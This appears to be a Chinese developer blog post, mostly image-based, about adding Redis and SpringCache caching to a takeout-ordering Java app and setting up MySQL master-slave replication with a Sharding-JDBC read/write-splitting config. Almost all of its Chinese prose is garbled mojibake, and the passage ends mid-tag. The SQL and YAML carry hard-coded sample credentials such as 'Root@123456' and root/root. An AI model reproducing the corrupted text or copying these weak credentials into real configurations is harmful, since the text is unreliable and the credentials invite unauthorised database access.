é™¤ç¼“å­˜ä¸­çš„éªŒè¯ç <br />ä¼˜åŒ–ä½ç½®ï¼šcom.xyy.controller.UserController sendMsgå’Œlogin<br />æ³¨å…¥RedisTemplete<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/e881a9dc80a740aab43c8bc30f45a91f.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />é’ˆå¯¹éªŒè¯ç è¿›è¡Œä¼˜åŒ–<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/4139a4aebf384f8e958f0587c7fe4acb.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />é’ˆå¯¹ç™»å½•åè¿›è¡Œä¼˜åŒ–<br />loginæ–¹æ³•ä¸­<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/ccc12a60c924407bb8c859aa66b61c38.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/24b7a6e20b7840e1a868dea4be2f0787.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />è¿™é‡Œè¿‡æ»¤å™¨ä¹Ÿè¦æ”¹ï¼Œå› ä¸ºç™»é™†çš„idæ•°æ®ç”±sessionå˜æˆäº†rediså­˜æ”¾ï¼Œæ‰€ä»¥è¦æŠŠè¿‡æ»¤å™¨çš„ç›¸å…³éƒ¨åˆ†è¿›è¡Œæ”¹é€ </p><p>â€‹<br />â€‹    com.xyy.filter.LoginCheckFilter</p><p>åŒæ ·è¦å…ˆæ³¨å…¥RedisTemplate<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/bb4030b56bd64c6dbdc5633c67e4bbfb.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><h2 id="ç¼“å­˜å‰å°èœå“æ•°æ®"><a class="markdownIt-Anchor" href="#ç¼“å­˜å‰å°èœå“æ•°æ®"></a> ç¼“å­˜å‰å°èœå“æ•°æ®</h2><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/32925b5c084942ecb5f5f9aa153a6d96.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />ç¼“å­˜æ€è·¯ï¼Œè¦ä¿è¯ç¼“å­˜æ•°æ®åº“å’ŒDBMSå†…çš„æ•°æ®ä¿æŒåŒæ­¥ï¼Œé¿å…è¯»åˆ°è„æ•°æ®ï¼ˆæ²¡æ›´æ–°çš„æ•°æ®ï¼‰<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/ed16b6270e734adaaf78058373894604.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />å¯¹DishControllerè¿›è¡Œä¼˜åŒ–ï¼ŒåŠ å…¥äº†ç¼“å­˜<br />å†æ¬¡è®¿é—®å¯ä»¥å‘ç°ï¼Œå¦‚æœå·²ç»ç¼“å­˜è¿‡äº†å½“å‰çš„èœå“åˆ†ç±»ï¼Œå°±ä¸ä¼šå†æŸ¥æ•°æ®åº“äº†</p><h3 id="æ›´æ–°èœå“åŒæ—¶æ›´æ–°ç¼“å­˜"><a class="markdownIt-Anchor" href="#æ›´æ–°èœå“åŒæ—¶æ›´æ–°ç¼“å­˜"></a> æ›´æ–°èœå“åŒæ—¶æ›´æ–°ç¼“å­˜</h3><p>ä¿è¯å°‘å‡ºç°è„æ•°æ®ï¼Œæ‰€ä»¥åŠ å…¥æ¸…ç†ç¼“å­˜ï¼Œä¸åŠæ—¶æ¸…ç†çš„è¯ï¼Œæ–°æ•°æ®ä¿å­˜ä¸Šæ¥ï¼Œåˆ—è¡¨æ•°æ®åº“æ— æ³•åŒæ­¥æ›´æ–°ã€‚å°±ä¼šå‡ºç°é—®é¢˜ã€‚<br />è¿™é‡Œæ¸…ç†ç²¾ç¡®æ•°æ®ã€‚å¤§é¢ç§¯æ¸…ç¼“å­˜ä¹Ÿæ˜¯æ¯”è¾ƒè´¹æ€§èƒ½çš„<br />è¿™ç§å°±æ˜¯å…¨æ¸…ç†<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/60b7f47bf7d24be0bec55a2309e1f227.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />è¿™ç§æ˜¯ç²¾ç¡®æ¸…ç†<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/958c3fd2cb824012af93adfd54d4ea24.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><h2 id="springcache"><a class="markdownIt-Anchor" href="#springcache"></a> SpringCache</h2><h3 id="ç®€ä»‹"><a class="markdownIt-Anchor" href="#ç®€ä»‹"></a> ç®€ä»‹</h3><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/a59b7272acce47e98a6bd7505772e071.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><h3 id="springcacheå¸¸ç”¨æ³¨è§£åŠåŠŸèƒ½"><a class="markdownIt-Anchor" href="#springcacheå¸¸ç”¨æ³¨è§£åŠåŠŸèƒ½"></a> SpringCacheå¸¸ç”¨æ³¨è§£åŠåŠŸèƒ½</h3><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/768c769e2725422f88530feca96d70b8.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><h3 id="å¿«é€Ÿèµ·æ­¥"><a class="markdownIt-Anchor" href="#å¿«é€Ÿèµ·æ­¥"></a> å¿«é€Ÿèµ·æ­¥</h3><p>å¯åŠ¨ç±»ä¸Šè¦åŠ å…¥<code>@EnableCaching</code>æ³¨è§£ï¼Œå¯ç”¨ç¼“å­˜æ¡†æ¶<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/d29b058bff0d4269aa35202a9e35143d.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><h4 id="cacheputæ³¨è§£"><a class="markdownIt-Anchor" href="#cacheputæ³¨è§£"></a> @CachePutæ³¨è§£</h4><p>ç¼“å­˜æ–¹æ³•è¿”å›å€¼ï¼Œç¼“å­˜ä¸€æ¡æˆ–è€…å¤šæ¡æ•°æ®<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/0d18d4dcaad54cc7814e3fa1a82ed8c8.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><h4 id="cacheevictæ³¨è§£"><a class="markdownIt-Anchor" href="#cacheevictæ³¨è§£"></a> @CacheEvictæ³¨è§£</h4><p>åˆ é™¤ç¼“å­˜<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/ae87712409804775b614bebb226e8896.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><h4 id="cacheableæ³¨è§£"><a class="markdownIt-Anchor" href="#cacheableæ³¨è§£"></a> @Cacheableæ³¨è§£</h4><p>å…ˆçœ‹çœ‹Springæ˜¯å¦å·²ç»ç¼“å­˜äº†å½“å‰æ•°æ®ï¼Œå¦‚æœå·²ç»ç¼“å­˜é‚£ä¹ˆç›´æ¥è¿”å›ã€‚<br />å¦‚æœæ²¡æœ‰ç¼“å­˜å°±ç›´æ¥ç¼“å­˜åˆ°å†…å­˜é‡Œ<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/c2e3aa34ea3442d894543d105ebb9b41.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />ä¸€äº›ç‰¹æ®Šæƒ…å†µï¼Œconditionå±æ€§å’ŒUnlesså±æ€§<img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/ec27f124b8c047e08a8b95af613ed922.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><p>å‰é¢éƒ½æ˜¯ç”¨SpringCacheè‡ªå¸¦çš„ç¼“å­˜å®¹å™¨ï¼Œæ€§èƒ½è‚¯å®šæ¯”ä¸äº†Redis<br />æ‰€ä»¥ç°åœ¨å¼€å§‹å¼•å…¥Redisä½œä¸ºSpringCacheç¼“å­˜çš„äº§å“<br />åˆ‡æ¢ä¸ºRedisä½œä¸ºç¼“å­˜äº§å“</p><h4 id="springcache-redis"><a class="markdownIt-Anchor" href="#springcache-redis"></a> SpringCache-Redis</h4><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/8dae4993b8494af598d870917e46ba56.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />å¯¼å…¥jaråŒ…<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/afdfe6133e254348a03303db222f1762.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />æ³¨å…¥ç›¸å¯¹åº”çš„ç¼“å­˜äº§å“Managerå°±å¯ä»¥äº†ï¼Œè¿™é‡Œä»¥RedisManagerä¸ºä¾‹<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/69344c2b79044bb7a354d96cb148d495.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><h2 id="åˆ©ç”¨springcache-redisæ¥ç¼“å­˜å¥—é¤æ•°æ®"><a class="markdownIt-Anchor" href="#åˆ©ç”¨springcache-redisæ¥ç¼“å­˜å¥—é¤æ•°æ®"></a> åˆ©ç”¨SpringCache-Redisæ¥ç¼“å­˜å¥—é¤æ•°æ®</h2><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/ffd8677c072d4697971562d1a96134bc.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />å¯åŠ¨ç±»ä¸Šè¦åŠ å…¥<code>@EnableCaching</code>æ³¨è§£ï¼Œå¯ç”¨ç¼“å­˜æ¡†æ¶<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/d29b058bff0d4269aa35202a9e35143d.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />åŠ å…¥æ³¨è§£æ—¶çš„å‘<br />è¿™é‡Œç›¸å½“äºæ˜¯ä»Returnä¸­æ‹¿åˆ°Setmealä¸­çš„å±æ€§ï¼Œä½†æ˜¯Returnæ—¶çš„æ•°æ®æ˜¯Resultå°è£…çš„Setmealæ•°æ®ï¼Œæ˜¾ç„¶æ— æ³•å®Œæˆåºåˆ—åŒ–ï¼Œè¿™é‡Œä¹Ÿæ˜¯éœ€è¦å¯¹Resultç±»è¿›è¡Œåºåˆ—åŒ–çš„æ”¹é€ <br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/f1309a8146514e37bb8078ef9b0cc7ca.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />ç»§æ‰¿åºåˆ—åŒ–ç±»ï¼Œä½¿å…¶å¯ä»¥åºåˆ—åŒ–<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/f25595d9069441d1adf22a469e842c09.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />=æ­¤æ—¶å°±å®Œæˆäº†ç¼“å­˜çš„ä¼˜åŒ–ï¼Œæ­¤æ—¶å¦‚æœç¼“å­˜ä¸­æœ‰å½“å‰valueåå­—çš„ç¼“å­˜ï¼Œå°±è‡ªåŠ¨è¿”å›ï¼Œå¦‚æœæ²¡æœ‰å°±æŸ¥è¯¢ä¸€ä¸‹ã€‚å½“å‰ç¼“å­˜è‡ªåŠ¨è¿‡æœŸçš„æ—¶é—´åœ¨ymlé‡Œé¢æœ‰è¯¦ç»†é…ç½®</p><p>ä¿å­˜å¥—é¤æ–¹æ³•ç¼“å­˜ä¼˜åŒ–<br />ä¸€ä¿å­˜å¥—é¤ï¼Œå¯¹åº”çš„ç¼“å­˜å°±å¾—åˆ é™¤ï¼Œå› ä¸ºæ•°æ®æ›´æ–°äº†è¦é‡æ–°è·å–<br />è¿˜æœ‰æ›´æ–°å¥—é¤ï¼Œç†ç”±åŒä¸Š<br />åˆ é™¤æ–¹æ³•è¦åŠ <br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/0896df7570f843a19afb69975c4a328f.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />ä¿å­˜æ–¹æ³•ä¹Ÿè¦åŠ <br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/3206a5c50388428ea4809425d083bc72.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><h1 id="æ•°æ®åº“ä¼˜åŒ–"><a class="markdownIt-Anchor" href="#æ•°æ®åº“ä¼˜åŒ–"></a> æ•°æ®åº“ä¼˜åŒ–</h1><h2 id="mysqlè¯»å†™åˆ†ç¦»"><a class="markdownIt-Anchor" href="#mysqlè¯»å†™åˆ†ç¦»"></a> MySQLè¯»å†™åˆ†ç¦»</h2><p>å°†å•ç‚¹æ•°æ®åº“æ”¹æˆåˆ†å¸ƒå¼çš„æ•°æ®åº“æœåŠ¡å™¨<br />ä¸»å†™ä»è¯»ã€‚<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/95b2e61b3c594adeac1732bcc6d719d6.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/be32928754c8409785c39f857ee78381.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><h2 id="mysqlä¸»ä»å¤åˆ¶æ­å»º"><a class="markdownIt-Anchor" href="#mysqlä¸»ä»å¤åˆ¶æ­å»º"></a> MySQLä¸»ä»å¤åˆ¶æ­å»º</h2><h3 id="ä¸»åº“è®¾ç½®"><a class="markdownIt-Anchor" href="#ä¸»åº“è®¾ç½®"></a> ä¸»åº“è®¾ç½®</h3><p>ä¸»ä»å¤åˆ¶æ¶æ„å›¾<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/c72d940c5ff143ea834e53e05fb4db83.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />ä»¥ä¸Šå°±å¯ä»¥åšåˆ°ä¸»åº“æ•°æ®å’Œä»åº“æ•°æ®ä¿æŒåŒæ­¥</p><p>å¯¹ä¸»åº“è¿›è¡Œé…ç½®<br />Linuxæ”¹æ³•<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/71faca81d5524f7f81249639ec421334.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><p>â€‹    log-bin=mysql-bin #å¯åŠ¨äºŒè¿›åˆ¶<br />â€‹    server-id=100 #å”¯ä¸€id</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/07f64dd342a54a02bb9db8055535c02d.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><p>windowsæ”¹æ³•</p><p>åœ¨mysqlå®‰è£…è·¯å¾„ä¸‹<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/ddcf86e4bfc344c3874a528909018c4d.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/d85b28a9fe5c4fdebb9bef5d96717860.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><p>ä¿®æ”¹å¥½äº†é‡å¯MySQL</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/841a999f27fe4910baf41c7ba6728ad7.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />windowsç‰ˆæœ¬çš„é‡å¯æ•™ç¨‹åœ¨è¿™é‡Œ<br /><a href="https://blog.csdn.net/weixin_31444279/article/details/113223859">é‡å¯mysql</a></p><p>=======================================================</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/06539e930d864f08831019eed03e50c0.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><p>â€‹<br />â€‹    GRANT REPLICATION SLAVE ON*.*toâ€™xiaomingâ€™@â€™%'identified by â€˜Root@123456â€™;</p><p>è¿™é‡Œæˆ‘æŠŠæœ¬åœ°çš„MySQLä½œä¸ºä¸»æœºï¼ŒæŠŠé˜¿é‡Œäº‘ä½œä¸ºä»æœº<br />è¿è¡Œä¸€ä¸‹æƒé™SQL<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/bbbc91e5cd674f60a0e3765c1e3a477b.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><p>æŸ¥çœ‹ä¸»æœºçŠ¶æ€<code>show master status;</code><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/2c46f23083eb4d009cee681610f20467.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><h3 id="ä»åº“è®¾ç½®"><a class="markdownIt-Anchor" href="#ä»åº“è®¾ç½®"></a> ä»åº“è®¾ç½®</h3><p>ä»åº“è¿™é‡Œé€‰æ‹©äº†é˜¿é‡Œäº‘<br />è¿˜æ˜¯å…ˆä¿®æ”¹é…ç½®æ–‡ä»¶ï¼ŒåŠ å…¥ç«¯å£id<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/59c47eb35c4748948c96ac6bf1a0eb17.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/b8ac44ce50c546b5bfeb507a0ab7ef4f.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />ç¬¬äºŒæ­¥è¿˜æ˜¯ä»åº“é‡å¯ï¼ˆLinuxä¸­ï¼‰<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/5f1f8347417441ccb00d15c08ff5cb5a.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />ç¬¬ä¸‰éƒ¨ï¼Œè®¾ç½®è¿æ¥åˆ°ä¸»æœº<br />è¿è¡ŒSQL<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/dda57b14af0845aca9056e4788a34fea.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><p>è¿è¡Œä¸€ä¸‹<br />å…·ä½“çš„å¯ä»¥å»ä»æœºç”¨show master statusæŸ¥çœ‹</p><p>â€‹<br />â€‹    change master to master_host=â€˜ipâ€™,master_user=â€˜xiaomingâ€™,master_password=â€˜Root@123456â€™,master_log_file=â€˜mysql-bin.eo0001â€™,master_log_pos=ä¸»æœºçš„position</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1f88d8237d804843849777aa1c3e0f4e.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/e9080c8d03a24206a4a00b553b1c9ade.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />è¿™é‡Œæˆ‘æ˜¯ä¸¤å°æœåŠ¡å™¨ï¼Œä¸€å°dockerå®‰è£…çš„mysqlï¼ˆä»æœºï¼‰<br />å¦ä¸€å°æ˜¯æ™®é€šå®‰è£…çš„mysqlåšä¸»æœºï¼Œé…ç½®è¿‡ç¨‹ä¸­é‡åˆ°äº†å¾ˆå¤šé—®é¢˜ï¼Œå‚è€ƒäº†ä¸‹é¢çš„é“¾æ¥<br /><a href="https://blog.csdn.net/xizhen2791/article/details/123660049">å‚è€ƒæ•™ç¨‹</a></p><p>ä¸€å®šä¸€å®šè®°ç€ä¸Šé¢ä»æœºè¿æ¥å‘½ä»¤è¿è¡ŒæˆåŠŸåè¦å¯åŠ¨ä»æœºä¹Ÿå°±æ˜¯</p><p>â€‹<br />â€‹    slave start</p><p>æœ€åè¿è¡Œ<code>start slave</code>å°±ç®—æ˜¯æ‰§è¡ŒæˆåŠŸäº†<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/cf6e9e14501149a197b7a6cc329cc1d0.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />æŸ¥çœ‹ä¸€ä¸‹ä»æœºçŠ¶æ€</p><p>â€‹<br />â€‹    show slave status</p><p>è¿™æ ·å°±ç®—æ­å»ºå¥½äº†<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/54747e8178044d8c9f68a7ecf1862bb7.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><h3 id="æµ‹è¯•"><a class="markdownIt-Anchor" href="#æµ‹è¯•"></a> æµ‹è¯•</h3><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/e471059730274a98a3a6b2e71728724f.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/dc067197d93b4799a37e5d51f28c5736.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/5657bb24170a4fbe8a9139b954934164.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />åˆ°è¿™é‡Œå°±ç®—æ­å»ºå®Œæˆäº†</p><h3 id="é‡åˆ°çš„é—®é¢˜"><a class="markdownIt-Anchor" href="#é‡åˆ°çš„é—®é¢˜"></a> é‡åˆ°çš„é—®é¢˜</h3><p>è¿™é‡Œé‡åˆ°çš„é—®é¢˜ï¼Œè¿ä¸ä¸Š<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/cbb888adff9c45be994e4087e528d9dc.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />æƒ³æœ¬åœ°å½“ä¸»æœºï¼Œå¤–ç½‘å½“ä»æœºå¥½åƒä¸å¤ªè¡Œï¼Œæˆ‘å°±åˆå¼„äº†å°æœåŠ¡å™¨åšè¯»å†™åˆ†ç¦»</p><p>æåˆ°äº†ä»æœºä¹‹åï¼Œå°±å¼€å§‹é…ç½®ï¼Œå®‰è£…MySQLç­‰ç­‰</p><p>æœ‰çš„æ—¶å€™ä¼šæç¤ºioå†²çªï¼Œè¿™æ˜¯å› ä¸ºä¹‹å‰çš„ä»æœºæ²¡æœ‰å…³é—­ï¼Œå…³é—­ä¸€ä¸‹å°±å¯ä»¥äº†<br /><code>stop slave</code> ä¸€ä¸‹ å°±å¯ä»¥è¿è¡Œäº†</p><p>ä¸€ä¸ªä»æœºå¯åŠ¨å‘½ä»¤å¿˜è®°äº†ï¼Œæ”¹äº†ä¸€æ™šä¸Š<br />å¦‚æœä¸è¿è¡Œä»æœºå¯åŠ¨å°±ä¼šå˜æˆè¿™æ ·<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/85ee4381b01c44ccb0777995ba042e46.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><h2 id="ä¸»å†™ä»è¯»å®æˆ˜"><a class="markdownIt-Anchor" href="#ä¸»å†™ä»è¯»å®æˆ˜"></a> ä¸»å†™ä»è¯»å®æˆ˜</h2><h3 id="æ¦‚è¿°-2"><a class="markdownIt-Anchor" href="#æ¦‚è¿°-2"></a> æ¦‚è¿°</h3><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/f141bcd96b9840bd8a4e1295055408a1.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />éš¾ä¹ˆå¦‚ä½•å»ç¡®å®šæ¥çš„SQLåº”è¯¥åˆ†é…åˆ°å“ªä¸ªåº“ä¸Šï¼Œè¿™ä¸ªå°±è¦é Sharding-jdbcæ¡†æ¶æ¥è¯»å†™åˆ†ç¦»çš„åˆ†æµå¤„ç†<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/83f78cd07cd848de9c4b5abd422d4b91.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><h3 id="å®æˆ˜"><a class="markdownIt-Anchor" href="#å®æˆ˜"></a> å®æˆ˜</h3><p>æ­¥éª¤å¦‚ä¸‹<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/f72981dfa9204bab9545793d04bc2ed9.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />å¯¼å…¥Mavenåæ ‡</p>  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.shardingsphere<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>sharding-jdbc-spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0.0-RC1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>é…ç½®ymlæ–‡ä»¶</p>  <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">spring:</span><br>  <span class="hljs-attr">application:</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">ccTakeOut</span><br>  <span class="hljs-attr">shardingsphere:</span><br>    <span class="hljs-attr">datasource:</span><br>      <span class="hljs-attr">names:</span><br>        <span class="hljs-string">master,slave</span><br>      <span class="hljs-comment"># ä¸»åº“ï¼ˆå¢åˆ æ”¹æ“ä½œï¼‰</span><br>      <span class="hljs-attr">master:</span><br>        <span class="hljs-attr">type:</span> <span class="hljs-string">com.alibaba.druid.pool.DruidDataSource</span><br>        <span class="hljs-attr">driver-class-name:</span> <span class="hljs-string">com.mysql.jdbc.Driver</span><br>        <span class="hljs-attr">url:</span> <span class="hljs-string">jdbc:mysql://192.168.23.132:3307/reggie?characterEncoding=utf-8</span><br>        <span class="hljs-attr">username:</span> <span class="hljs-string">root</span><br>        <span class="hljs-attr">password:</span> <span class="hljs-string">root</span><br>      <span class="hljs-comment"># ä»æ•°æ®æºï¼ˆè¯»æ“ä½œï¼‰</span><br>      <span class="hljs-attr">slave:</span><br>        <span class="hljs-attr">type:</span> <span class="hljs-string">com.alibaba.druid.pool.DruidDataSource</span><br>        <span class="hljs-attr">driver-class-name:</span> <span class="hljs-string">com.mysql.jdbc.Driver</span><br>        <span class="hljs-attr">url:</span> <span class="hljs-string">jdbc:mysql://192.168.23.132:3308/reggie?characterEncoding=utf-8</span><br>        <span class="hljs-attr">username:</span> <span class="hljs-string">root</span><br>        <span class="hljs-attr">password:</span> <span class="hljs-string">root</span><br>    <span class="hljs-attr">masterslave:</span><br>      <span class="hljs-comment"># è¯»å†™åˆ†ç¦»é…ç½®</span><br>      <span class="hljs-attr">load-balance-algorithm-type:</span> <span class="hljs-string">round_robin</span> <span class="hljs-comment">#è½®è¯¢ï¼ˆå¦‚æœæœ‰å¤šä¸ªä»åº“ä¼šè½®è¯¢ç€è¯»ï¼‰</span><br>      <span class="hljs-comment"># æœ€ç»ˆçš„æ•°æ®æºåç§°</span><br>      <span class="hljs-attr">name:</span> <span class="hljs-string">dataSource</span><br>      <span class="hljs-comment"># ä¸»åº“æ•°æ®æºåç§°</span><br>      <span class="hljs-attr">master-data-source-name:</span> <span class="hljs-string">master</span><br>      <span class="hljs-comment"># ä»åº“æ•°æ®æºåç§°åˆ—è¡¨ï¼Œå¤šä¸ªé€—å·åˆ†éš”</span><br>      <span class="hljs-attr">slave-data-source-names:</span> <span class="hljs-string">slave</span><br>    <span 